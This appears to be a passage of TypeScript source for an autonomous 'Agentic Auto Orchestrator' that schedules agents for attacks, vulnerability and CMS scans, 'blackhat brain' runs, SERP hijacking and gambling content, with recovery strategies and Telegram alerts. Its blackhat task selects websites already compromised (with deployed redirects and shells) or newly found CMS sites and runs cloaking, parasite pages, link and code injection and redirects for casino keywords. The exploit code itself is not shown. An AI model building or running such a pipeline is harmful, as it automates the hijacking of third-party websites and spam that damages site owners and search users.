 * Finds targets with known vulnerabilities/shells and runs full blackhat AI pipeline
 */
async function executeBlackhatBrainTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database not available" };

    // Find targets that have been successfully attacked (have deployed redirects)
    const successTargets = await db.select({
      id: agenticSessions.id,
      targetDomain: agenticSessions.currentTarget,
      targetsSucceeded: agenticSessions.targetsSucceeded,
      status: agenticSessions.status,
      targetCms: agenticSessions.targetCms,
    })
      .from(agenticSessions)
      .where(
        and(
          eq(agenticSessions.status, "completed"),
          sql`${agenticSessions.targetsSucceeded} > 0`,
        )
      )
      .orderBy(desc(agenticSessions.createdAt))
      .limit(10);

    // Also find discovered targets with known CMS for fresh attacks
    const cmsTargets = await db.select({
      id: serpDiscoveredTargets.id,
      domain: serpDiscoveredTargets.domain,
      url: serpDiscoveredTargets.url,
      cms: serpDiscoveredTargets.cms,
    })
      .from(serpDiscoveredTargets)
      .where(
        and(
          isNotNull(serpDiscoveredTargets.cms),
          ne(serpDiscoveredTargets.cms, "unknown"),
          eq(serpDiscoveredTargets.status, "discovered"),
        )
      )
      .orderBy(sql`RAND()`)
      .limit(5);

    // Pick the best target for blackhat brain
    let targetDomain: string | null = null;
    let targetCms: string | undefined;

    if (successTargets.length > 0) {
      // Prioritize targets with existing shells for post-exploitation
      const target = successTargets[Math.floor(Math.random() * successTargets.length)];
      targetDomain = target.targetDomain;
    } else if (cmsTargets.length > 0) {
      // Fall back to CMS targets for fresh attacks
      const target = cmsTargets[Math.floor(Math.random() * cmsTargets.length)];
      targetDomain = target.domain;
      targetCms = target.cms || undefined;
    }

    if (!targetDomain) {
      return { success: true, result: { message: "No suitable targets for blackhat brain", skipped: true } };
    }

    const keywords = (task.config?.keywords as string[]) || ["casino", "slot", "betting", "gambling"];

    const aggressivenessMap: Record<string, number> = { low: 3, medium: 5, high: 7, maximum: 10 };
    const aggrLevel = (task.config?.aggressiveness as string) || "high";

    const brainConfig: BlackhatBrainConfig = {
      targetDomain,
      targetUrl: `https://${targetDomain}`,
      redirectUrl: (task.config?.redirectUrl as string) || "https://example.com",
      seoKeywords: keywords,
      userId: 1,
      aggressiveness: aggressivenessMap[aggrLevel] || 7,
      maxTechniques: (task.config?.maxTechniques as number) || 8,
      targetProfile: targetCms ? { cms: targetCms } : undefined,
      enabledCategories: ["cloaking", "doorway", "parasite", "link_injection", "redirect", "content_manip", "code_injection"],
      signal,
    };

    console.log(`[Orchestrator] 🧠 Starting Blackhat Brain for ${targetDomain} (CMS: ${targetCms || "unknown"}, aggression: ${brainConfig.aggressiveness})`);

    const result = await runAgenticBlackhatBrain(brainConfig);

    return {
      success: result.successfulTechniques > 0,
      result: {
        sessionId: result.sessionId,
        targetDomain: result.targetDomain,
        totalTechniques: result.totalTechniques,
        successfulTechniques: result.successfulTechniques,
        failedTechniques: result.failedTechniques,
        aiStrategy: result.aiStrategy,
        telegramSent: result.telegramSent,
        durationMs: result.totalDurationMs,
        message: `Blackhat Brain: ${result.successfulTechniques}/${result.totalTechniques} techniques succeeded on ${targetDomain}`,
      },
    };
  } catch (err: any) {
    return { success: false, error: err.message };
  }
}

// ═══════════════════════════════════════════════
//  ORCHESTRATOR TICK — Main loop
// ═══════════════════════════════════════════════

async function orchestratorTick() {
  if (!orchestratorState.isRunning) return;

  orchestratorState.cycleCount++;
  const now = Date.now();

  for (const [agentName, agentConfig] of Object.entries(orchestratorState.agents) as [AgentName, AgentConfig][]) {
    if (!agentConfig.enabled) continue;

    // Check if it's time to run this agent
    const nextRun = agentConfig.nextRunAt || 0;
    if (now < nextRun) continue;

    // Check consecutive failures — attempt auto-recovery or back off
    if (agentConfig.consecutiveFailures >= 5) {
      // Try auto-recovery (max 3 attempts per agent)
      if (agentConfig.recoveryAttempts < MAX_RECOVERY_ATTEMPTS && !agentConfig.isRecovering) {
        await attemptAutoRecovery(agentName as AgentName, agentConfig);
        continue;
      }
      // If recovery exhausted or in progress, exponential backoff
      const backoffMultiplier = Math.min(Math.pow(2, agentConfig.consecutiveFailures - 4), 8);
      agentConfig.nextRunAt = now + (agentConfig.intervalMs * backoffMultiplier);
      console.warn(`[Orchestrator] Agent '${agentName}' has ${agentConfig.consecutiveFailures} consecutive failures (recovery exhausted: ${agentConfig.recoveryAttempts}/${MAX_RECOVERY_ATTEMPTS}), backing off to ${Math.round(agentConfig.intervalMs * backoffMultiplier / 60000)}min`);
      continue;
    }

    // Enqueue the task
    try {
      const taskTypeMap: Record<AgentName, TaskType> = {
        attack: "attack_session",
        seo: "seo_daily",
        scan: "vuln_scan",
        research: "research_cycle",
        learning: "learning_cycle",
        cve: "cve_update",
        keyword_discovery: "keyword_discovery",
        gambling_brain: "gambling_brain_cycle",
        cms_scan: "cms_scan",
        blackhat_brain: "blackhat_brain",
        sprint_engine: "sprint_day",
        ctr_engine: "ctr_tick",
        freshness_engine: "freshness_tick",
        gap_analyzer: "gap_analysis",
        serp_hijacker: "serp_hijack",
        serp_harvester: "serp_harvest",
        content_distributor: "content_distribute",
      };

      const taskId = await enqueueTask({
        taskType: taskTypeMap[agentName],
        subsystem: "orchestrator",
        title: `Auto ${agentName} — cycle #${orchestratorState.cycleCount}`,
        description: `Autonomous ${agentName} agent triggered by orchestrator`,
        priority: agentName === "attack" ? "high" : "medium",
      });

      agentConfig.lastRunAt = now;
      agentConfig.nextRunAt = now + agentConfig.intervalMs;
      agentConfig.totalRuns++;

      console.log(`[Orchestrator] ▶ Enqueued ${agentName} task #${taskId} (next run in ${Math.round(agentConfig.intervalMs / 60000)}min)`);
    } catch (err: any) {
      agentConfig.consecutiveFailures++;
      console.error(`[Orchestrator] Failed to enqueue ${agentName}: ${err.message}`);
    }
  }
}

// ═══════════════════════════════════════════════
//  LIFECYCLE
// ═══════════════════════════════════════════════

/**
 * Start the Agentic Auto Orchestrator
 */
export function startOrchestrator(customAgents?: Partial<Record<AgentName, Partial<AgentConfig>>>) {
  if (orchestratorState.isRunning) {
    console.log("[Orchestrator] Already running");
    return;
  }

  // Apply custom configs
  if (customAgents) {
    for (const [name, config] of Object.entries(customAgents)) {
      if (orchestratorState.agents[name]) {
        Object.assign(orchestratorState.agents[name], config);
      }
    }
  }

  // Register all executors with the daemon
  registerExecutor("attack_session", executeAttackTask);
  registerExecutor("seo_daily", executeSeoTask);
  registerExecutor("vuln_scan", executeScanTask);
  registerExecutor("research_cycle", executeResearchTask);
  registerExecutor("learning_cycle", executeLearningTask);
  registerExecutor("cve_update", executeCveTask);
  registerExecutor("keyword_discovery", executeKeywordDiscoveryTask);
  registerExecutor("gambling_brain_cycle", executeGamblingBrainTask);
  registerExecutor("cms_scan", executeCmsScanTask);
  registerExecutor("blackhat_brain", executeBlackhatBrainTask);
  registerExecutor("sprint_day", executeSprintDayTask);
  registerExecutor("ctr_tick", executeCtrTickTask);
  registerExecutor("freshness_tick", executeFreshnessTickTask);
  registerExecutor("gap_analysis", executeGapAnalysisTask);
  registerExecutor("serp_hijack", executeSerpHijackTask);
  registerExecutor("serp_harvest", executeSerpHarvestTask);
  registerExecutor("content_distribute", executeContentDistributeTask);

  // Set initial next-run times (stagger to avoid thundering herd)
  const now = Date.now();
  let staggerMs = 0;
  for (const [name, config] of Object.entries(orchestratorState.agents) as [AgentName, AgentConfig][]) {
    if (config.enabled && config.autoStart) {
      config.nextRunAt = now + staggerMs;
      staggerMs += 2 * 60_000; // Stagger by 2 minutes
    }
  }

  orchestratorState.isRunning = true;
  orchestratorState.startedAt = now;

  // Start the tick loop
  orchestratorTimer = setInterval(() => {
    orchestratorTick().catch(err =>
      console.error(`[Orchestrator] Tick error: ${err.message}`)
    );
  }, ORCHESTRATOR_TICK_MS);

  // Start success rate monitor
  startSuccessRateMonitor();

  // Subscribe to daemon events to track agent success/failure
  wireOrchestratorDaemonEvents();

  console.log("[Orchestrator] \u{1F916} Agentic Auto Orchestrator started \u2014 all agents active");
  console.log(`[Orchestrator] Agents: ${Object.entries(orchestratorState.agents).filter(([, c]) => c.enabled).map(([n]) => n).join(", ")}`);
}

/**
 * Stop the orchestrator
 */
export function stopOrchestrator() {
  if (!orchestratorState.isRunning) return;

  stopSuccessRateMonitor();
  orchestratorState.isRunning = false;
  if (orchestratorTimer) {
    clearInterval(orchestratorTimer);
    orchestratorTimer = null;
  }

  console.log("[Orchestrator] ⏹ Agentic Auto Orchestrator stopped");
}

/**
 * Get orchestrator status
 */
export function getOrchestratorStatus(): OrchestratorState & {
  agentDetails: Array<{
    name: string;
    enabled: boolean;
    intervalMinutes: number;
    lastRunAt: string | null;
    nextRunAt: string | null;
    consecutiveFailures: number;
    totalRuns: number;
    totalSuccesses: number;
    healthStatus: "healthy" | "degraded" | "failing" | "recovering";
    recoveryAttempts: number;
    recoveryStrategy: string | null;
    isRecovering: boolean;
  }>;
} {
  const agentDetails = Object.entries(orchestratorState.agents).map(([name, config]) => {
    let healthStatus: "healthy" | "degraded" | "failing" | "recovering" = "healthy";
    if (config.isRecovering) healthStatus = "recovering";
    else if (config.consecutiveFailures >= 5) healthStatus = "failing";
    else if (config.consecutiveFailures >= 2) healthStatus = "degraded";

    return {
      name,
      enabled: config.enabled,
      intervalMinutes: Math.round(config.intervalMs / 60_000),
      lastRunAt: config.lastRunAt ? new Date(config.lastRunAt).toISOString() : null,
      nextRunAt: config.nextRunAt ? new Date(config.nextRunAt).toISOString() : null,
      consecutiveFailures: config.consecutiveFailures,
      totalRuns: config.totalRuns,
      totalSuccesses: config.totalSuccesses,
      healthStatus,
      recoveryAttempts: config.recoveryAttempts,
      recoveryStrategy: config.recoveryStrategy || null,
      isRecovering: config.isRecovering,
    };
  });

  return {
    ...orchestratorState,
    agentDetails,
  };
}

/**
 * Update agent configuration
 */
export function updateAgentConfig(agentName: string, updates: Partial<AgentConfig>) {
  if (!orchestratorState.agents[agentName]) {
    throw new Error(`Unknown agent: ${agentName}`);
  }
  Object.assign(orchestratorState.agents[agentName], updates);
  console.log(`[Orchestrator] Agent '${agentName}' config updated:`, updates);
}

/**
 * Trigger an agent immediately (bypass interval)
 */
export function triggerAgentNow(agentName: string) {
  if (!orchestratorState.agents[agentName]) {
    throw new Error(`Unknown agent: ${agentName}`);
  }
  orchestratorState.agents[agentName].nextRunAt = Date.now();
  console.log(`[Orchestrator] Agent '${agentName}' triggered for immediate execution`);
}

/**
 * Reset agent failure count
 */
export function resetAgentFailures(agentName: string) {
  if (!orchestratorState.agents[agentName]) {
    throw new Error(`Unknown agent: ${agentName}`);
  }
  orchestratorState.agents[agentName].consecutiveFailures = 0;
  console.log(`[Orchestrator] Agent '${agentName}' failure count reset`);
}

// ═══════════════════════════════════════════════
//  AUTO-RECOVERY SYSTEM
// ═══════════════════════════════════════════════

/** Recovery strategies per agent type */
interface RecoveryStrategy {
  name: string;
  description: string;
  apply: (agentName: AgentName, config: AgentConfig) => void;
}

const RECOVERY_STRATEGIES: Record<AgentName, RecoveryStrategy[]> = {
  attack: [
    {
      name: "reduce_targets",
      description: "Reduce maxTargetsPerRun from 30 to 10",
      apply: (_name, config) => {
        config.intervalMs = Math.max(config.intervalMs, 3 * 60 * 60_000); // At least 3h
      },
    },
    {
      name: "increase_interval",
      description: "Increase interval to 4 hours",
      apply: (_name, config) => {
        config.intervalMs = 4 * 60 * 60_000;
      },
    },
    {
      name: "safe_mode",
      description: "Switch to discovery_only mode with 6h interval",
      apply: (_name, config) => {
        config.intervalMs = 6 * 60 * 60_000;
      },
    },
  ],
  seo: [
    {
      name: "reduce_concurrency",
      description: "Reduce maxConcurrent to 1",
      apply: (_name, config) => { config.maxConcurrent = 1; },
    },
    {
      name: "increase_interval",
      description: "Increase interval to 8 hours",
      apply: (_name, config) => { config.intervalMs = 8 * 60 * 60_000; },
    },
    {
      name: "minimal_mode",
      description: "Minimal SEO with 12h interval",
      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; config.maxConcurrent = 1; },
    },
  ],
  scan: [
    {
      name: "reduce_scope",
      description: "Reduce scan concurrency",
      apply: (_name, config) => { config.maxConcurrent = 1; },
    },
    {
      name: "increase_interval",
      description: "Increase interval to 12 hours",
      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
    },
    {
      name: "safe_mode",
      description: "Safe scan mode with 24h interval",
      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; config.maxConcurrent = 1; },
    },
  ],
  research: [
    {
      name: "increase_interval",
      description: "Increase interval to 12 hours",
      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
    },
    {
      name: "slow_mode",
      description: "Slow research mode with 24h interval",
      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
    },
    {
      name: "minimal_mode",
      description: "Minimal research with 48h interval",
      apply: (_name, config) => { config.intervalMs = 48 * 60 * 60_000; },
    },
  ],
  learning: [
    {
      name: "increase_interval",
      description: "Increase interval to 12 hours",
      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
    },
    {
      name: "slow_mode",
      description: "Slow learning with 24h interval",
      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
    },
    {
      name: "minimal_mode",
      description: "Minimal learning with 48h interval",
      apply: (_name, config) => { config.intervalMs = 48 * 60 * 60_000; },
    },
  ],
  cve: [
    {
      name: "increase_interval",
      description: "Increase interval to 48 hours",
      apply: (_name, config) => { config.intervalMs = 48 * 60 * 60_000; },
    },
    {
      name: "slow_mode",
      description: "Slow CVE updates with 72h interval",
      apply: (_name, config) => { config.intervalMs = 72 * 60 * 60_000; },
    },
    {
      name: "weekly_mode",
      description: "Weekly CVE updates",
      apply: (_name, config) => { config.intervalMs = 7 * 24 * 60 * 60_000; },
    },
  ],
  keyword_discovery: [
    {
      name: "increase_interval",
      description: "Increase interval to 6 hours",
      apply: (_name, config) => { config.intervalMs = 6 * 60 * 60_000; },
    },
    {
      name: "slow_mode",
      description: "Slow keyword discovery with 12h interval",
      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
    },
    {
      name: "minimal_mode",
      description: "Minimal keyword discovery with 24h interval",
      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
    },
  ],
  gambling_brain: [
    {
      name: "increase_interval",
      description: "Increase interval to 8 hours",
      apply: (_name, config) => { config.intervalMs = 8 * 60 * 60_000; },
    },
    {
      name: "slow_mode",
      description: "Slow gambling brain with 12h interval",
      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
    },
    {
      name: "minimal_mode",
      description: "Minimal gambling brain with 24h interval",
      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
    },
  ],
  cms_scan: [
    {
      name: "reduce_scope",
      description: "Reduce CMS scan concurrency",
      apply: (_name, config) => { config.maxConcurrent = 1; },
    },
    {
      name: "increase_interval",
      description: "Increase interval to 6 hours",
      apply: (_name, config) => { config.intervalMs = 6 * 60 * 60_000; },
    },
    {
      name: "minimal_mode",
      description: "Minimal CMS scan with 12h interval",
      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; config.maxConcurrent = 1; },
    },
  ],
  blackhat_brain: [
    {
      name: "reduce_aggressiveness",
      description: "Reduce aggressiveness and max techniques",
      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 4 * 60 * 60_000); },
    },
    {
      name: "increase_interval",
      description: "Increase interval to 6 hours",
      apply: (_name, config) => { config.intervalMs = 6 * 60 * 60_000; },
    },
    {
      name: "minimal_mode",
      description: "Minimal blackhat brain with 12h interval",
      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
    },
  ],
  sprint_engine: [
    {
      name: "reduce_content",
      description: "Reduce content velocity",
      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 24 * 60 * 60_000); },
    },
    {
      name: "increase_interval",
      description: "Increase sprint interval to 36h",
      apply: (_name, config) => { config.intervalMs = 36 * 60 * 60_000; },
    },
    {
      name: "pause_sprint",
      description: "Pause sprint engine",
      apply: (_name, config) => { config.enabled = false; },
    },
  ],
  ctr_engine: [
    {
      name: "reduce_posts",
      description: "Reduce daily post limit",
      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 18 * 60 * 60_000); },
    },
    {
      name: "increase_interval",
      description: "Increase CTR interval to 24h",
      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
    },
    {
      name: "pause_ctr",
      description: "Pause CTR engine",
      apply: (_name, config) => { config.enabled = false; },
    },
  ],
  freshness_engine: [
    {
      name: "increase_freshness_interval",
      description: "Increase freshness check interval to 72h",
      apply: (_name, config) => { config.intervalMs = 72 * 60 * 60_000; },
    },
    {
      name: "reduce_refresh_batch",
      description: "Reduce refresh batch size",
      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 96 * 60 * 60_000); },
    },
    {
      name: "pause_freshness",
      description: "Pause freshness engine",
      apply: (_name, config) => { config.enabled = false; },
    },
  ],
  gap_analyzer: [
    {
      name: "increase_gap_interval",
      description: "Increase gap analysis interval to 48h",
      apply: (_name, config) => { config.intervalMs = 48 * 60 * 60_000; },
    },
    {
      name: "reduce_gap_scope",
      description: "Reduce gap analysis scope",
      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 72 * 60 * 60_000); },
    },
    {
      name: "pause_gap_analyzer",
      description: "Pause gap analyzer",
      apply: (_name, config) => { config.enabled = false; },
    },
  ],
  serp_hijacker: [
    {
      name: "increase_hijack_interval",
      description: "Increase SERP hijack interval to 24h",
      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
    },
    {
      name: "reduce_hijack_scope",
      description: "Reduce SERP hijack scope",
      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 48 * 60 * 60_000); },
    },
    {
      name: "pause_serp_hijacker",
      description: "Pause SERP hijacker",
      apply: (_name, config) => { config.enabled = false; },
    },
  ],
  serp_harvester: [
    {
      name: "increase_harvest_interval",
      description: "Increase SERP harvest interval to 4h",
      apply: (_name, config) => { config.intervalMs = 4 * 60 * 60_000; },
    },
    {
      name: "reduce_harvest_niches",
      description: "Reduce harvest scope to fewer niches",
      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 6 * 60 * 60_000); },
    },
    {
      name: "pause_serp_harvester",
      description: "Pause SERP harvester",
      apply: (_name, config) => { config.enabled = false; },
    },
  ],
  content_distributor: [
    {
      name: "increase_distribute_interval",
      description: "Increase content distribution interval to 6h",
      apply: (_name, config) => { config.intervalMs = 6 * 60 * 60_000; },
    },
    {
      name: "reduce_distribute_platforms",
      description: "Reduce distribution scope",
      apply: (_name, config) => { config.intervalMs = Math.max(config.intervalMs, 8 * 60 * 60_000); },
    },
    {
      name: "pause_content_distributor",
      description: "Pause content distributor",
      apply: (_name, config) => { config.enabled = false; },
    },
  ],
};

/**
 * Attempt auto-recovery for a failing agent.
 * Applies progressive recovery strategies and sends Telegram notification.
 */
async function attemptAutoRecovery(agentName: AgentName, config: AgentConfig): Promise<void> {
  const now = Date.now();

  // Cooldown check: don't recover too frequently
  if (config.lastRecoveryAt && (now - config.lastRecoveryAt) < RECOVERY_COOLDOWN_MS) {
    return;
  }

  const strategies = RECOVERY_STRATEGIES[agentName];
  if (!strategies || config.recoveryAttempts >= strategies.length) {
    return; // No more strategies available
  }

  const strategy = strategies[config.recoveryAttempts];
  config.isRecovering = true;
  config.recoveryAttempts++;
  config.lastRecoveryAt = now;
  config.recoveryStrategy = strategy.name;
  orchestratorState.totalRecoveries++;

  // Save original config values for logging
  const prevInterval = Math.round(config.intervalMs / 60_000);
  const prevConcurrent = config.maxConcurrent;

  // Apply the recovery strategy
  strategy.apply(agentName, config);

  // Reset failure counter to give the agent a fresh chance
  config.consecutiveFailures = 0;
  config.isRecovering = false;

  // Schedule next run with a small delay (2 min)
  config.nextRunAt = now + 2 * 60_000;

  const newInterval = Math.round(config.intervalMs / 60_000);

  console.log(`[Orchestrator] 🔄 AUTO-RECOVERY for '${agentName}': strategy='${strategy.name}' (attempt ${config.recoveryAttempts}/${MAX_RECOVERY_ATTEMPTS}), interval ${prevInterval}min→${newInterval}min, concurrent ${prevConcurrent}→${config.maxConcurrent}`);

  // Send Telegram notification
  const msg = [
    `🔄 <b>AUTO-RECOVERY TRIGGERED</b>`,
    ``,
    `🤖 Agent: <b>${agentName}</b>`,
    `📋 Strategy: ${strategy.name} — ${strategy.description}`,
    `🔢 Recovery Attempt: ${config.recoveryAttempts}/${MAX_RECOVERY_ATTEMPTS}`,
    `⏱ Interval: ${prevInterval}min → ${newInterval}min`,
    `👥 Concurrent: ${prevConcurrent} → ${config.maxConcurrent}`,
    ``,
    `📊 Stats: ${config.totalRuns} runs, ${config.totalSuccesses} successes`,
    `⏰ Next run in 2 minutes`,
    ``,
    `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
  ].join("\n");

  sendTelegramNotification({
    type: "info",
    targetUrl: `orchestrator/recovery/${agentName}`,
    details: msg,
  }).catch(err => console.error(`[Orchestrator] Failed to send recovery alert: ${err.message}`));
}

/** Export for testing */
export { attemptAutoRecovery, RECOVERY_STRATEGIES, MAX_RECOVERY_ATTEMPTS, RECOVERY_COOLDOWN_MS };

// ═══════════════════════════════════════════════
//  DAEMON EVENT WIRING — Track agent success/failure
// ═══════════════════════════════════════════════

/** Reverse map: taskType → agentName */
const TASK_TYPE_TO_AGENT: Record<string, AgentName> = {
  attack_session: "attack",
  seo_daily: "seo",
  vuln_scan: "scan",
  research_cycle: "research",
  learning_cycle: "learning",
  cve_update: "cve",
  keyword_discovery: "keyword_discovery",
  gambling_brain_cycle: "gambling_brain",
   cms_scan: "cms_scan",
  blackhat_brain: "blackhat_brain",
  sprint_day: "sprint_engine",
  ctr_tick: "ctr_engine",
  freshness_tick: "freshness_engine",
  gap_analysis: "gap_analyzer",
  serp_hijack: "serp_hijacker",
  content_distribute: "content_distributor",
};
const FAILURE_ALERT_THRESHOLD = 3;
const failureAlertsSent = new Set<string>(); // Track which agents already sent failure alerts

function wireOrchestratorDaemonEvents() {
  onDaemonEvent((event) => {
    const taskType = (event.data as Record<string, unknown>)?._taskType as string | undefined;
    if (!taskType) return;

    const agentName = TASK_TYPE_TO_AGENT[taskType];
    if (!agentName || !orchestratorState.agents[agentName]) return;

    const agent = orchestratorState.agents[agentName];

    if (event.type === "task_completed") {
      agent.totalSuccesses++;
      const wasRecovering = agent.recoveryAttempts > 0 && agent.consecutiveFailures === 0;
      agent.consecutiveFailures = 0;
      failureAlertsSent.delete(agentName); // Reset alert flag on success

      // Track successful recovery
      if (wasRecovering) {
        orchestratorState.successfulRecoveries++;
        console.log(`[Orchestrator] 🎉 Agent '${agentName}' recovered successfully after ${agent.recoveryAttempts} recovery attempts (strategy: ${agent.recoveryStrategy})`);

        sendTelegramNotification({
          type: "success",
          targetUrl: `orchestrator/recovery/${agentName}`,
          details: [
            `🎉 <b>RECOVERY SUCCESS</b>`,
            ``,
            `🤖 Agent: <b>${agentName}</b>`,
            `📋 Strategy: ${agent.recoveryStrategy}`,
            `🔢 Recovery Attempts: ${agent.recoveryAttempts}`,
            `📊 Total Recoveries: ${orchestratorState.successfulRecoveries}/${orchestratorState.totalRecoveries}`,
            ``,
            `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
          ].join("\n"),
        }).catch(err => console.error(`[Orchestrator] Failed to send recovery success alert: ${err.message}`));
      }

      console.log(`[Orchestrator] ✅ Agent '${agentName}' task completed (total successes: ${agent.totalSuccesses})`);
    }

    if (event.type === "task_failed") {
      agent.consecutiveFailures++;
      console.warn(`[Orchestrator] ❌ Agent '${agentName}' task failed (consecutive: ${agent.consecutiveFailures})`);

      // Send Telegram alert on 3+ consecutive failures
      if (agent.consecutiveFailures >= FAILURE_ALERT_THRESHOLD && !failureAlertsSent.has(agentName)) {
        failureAlertsSent.add(agentName);
        const errorMsg = (event.data as Record<string, unknown>)?.error as string || "Unknown error";
        const msg = [
          `⚠️ <b>AGENT FAILURE ALERT</b>`,
          ``,
          `🤖 Agent: <b>${agentName}</b>`,
          `❌ Consecutive Failures: ${agent.consecutiveFailures}`,
          `📋 Last Error: ${errorMsg.substring(0, 200)}`,
          `📊 Total Runs: ${agent.totalRuns} | Successes: ${agent.totalSuccesses}`,
          ``,
          `⏰ Auto-recovery will attempt after 5 failures (max ${MAX_RECOVERY_ATTEMPTS} strategies).`,
          `🔧 Use Orchestrator Dashboard to reset or investigate.`,
          ``,
          `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
        ].join("\n");

        sendTelegramNotification({
          type: "failure",
          targetUrl: `orchestrator/${agentName}`,
          details: msg,
        }).catch(err => console.error(`[Orchestrator] Failed to send failure alert: ${err.message}`));
      }
    }
  });

  console.log("[Orchestrator] 📡 Daemon event listener wired — tracking agent success/failure");
}
